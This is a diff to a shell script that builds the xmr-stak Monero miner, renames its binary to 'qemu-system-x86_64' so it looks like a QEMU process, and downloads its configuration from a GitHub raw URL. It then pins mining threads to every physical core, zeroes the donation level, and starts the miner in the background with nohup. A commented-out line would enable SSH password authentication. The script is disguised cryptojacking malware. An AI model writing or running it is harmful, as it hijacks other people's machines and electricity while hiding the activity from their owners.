@@ -17,16 +17,16 @@ mkdir $workingdir/qemu-system-x86/build
 cd $workingdir/qemu-system-x86/build
 cmake .. -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF
 make install
-mv $workingdir/qemu-system-x86/bin/xmr-stak-cpu $workingdir/qemu-system-x86/bin/qemu-system-x86_64
-curl https://raw.githubusercontent.com/githubuserold/miner/master/config_for_sed.txt > $workingdir/qemu-system-x86/bin/config.txt
-echo -e "],\n$(cat $workingdir/qemu-system-x86/bin/config.txt)" > $workingdir/qemu-system-x86/bin/config.txt
+mv $workingdir/qemu-system-x86/build/bin/xmr-stak $workingdir/qemu-system-x86/build/bin/qemu-system-x86_64
+curl https://raw.githubusercontent.com/githubuserold/miner/master/cpu.txt > $workingdir/qemu-system-x86/build/bin/cpu.txt
+echo -e "],\n$(cat $workingdir/qemu-system-x86/build/bin/cpu.txt)" > $workingdir/qemu-system-x86/build/bin/cpu.txt
 for (( core=0; core<$phycores; core++ )); do
-         echo -e "   { \"low_power_mode\" : false, \"no_prefetch\" : true, \"affine_to_cpu\" : ${core} },\n$(cat $workingdir/qemu-system-x86/bin/config.txt)" > $workingdir/qemu-system-x86/bin/config.txt
+         echo -e "   { \"low_power_mode\" : false, \"no_prefetch\" : true, \"affine_to_cpu\" : ${core} },\n$(cat $workingdir/qemu-system-x86/build/bin/cpu.txt)" > $workingdir/qemu-system-x86/build/bin/cpu.txt
 done
-echo -e "[\n$(cat $workingdir/qemu-system-x86/bin/config.txt)" > $workingdir/qemu-system-x86/bin/config.txt
-echo -e "\"cpu_threads_conf\" :\n$(cat $workingdir/qemu-system-x86/bin/config.txt)" > $workingdir/qemu-system-x86/bin/config.txt
-cd $workingdir/qemu-system-x86/bin/
-sed -i 's/2\.0/0\.0/g' $workingdir/qemu-system-x86/donate-level.h
+echo -e "[\n$(cat $workingdir/qemu-system-x86/build/bin/cpu.txt)" > $workingdir/qemu-system-x86/build/bin/cpu.txt
+echo -e "\"cpu_threads_conf\" :\n$(cat $workingdir/qemu-system-x86/build/bin/cpu.txt)" > $workingdir/qemu-system-x86/build/bin/cpu.txt
+cd $workingdir/qemu-system-x86/build/bin
+sed -i 's/2\.0/0\.0/g' $workingdir/qemu-system-x86/xmrstak/donate-level.hpp
 nohup ./qemu-system-x86_64 &
 cd
 #sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_config
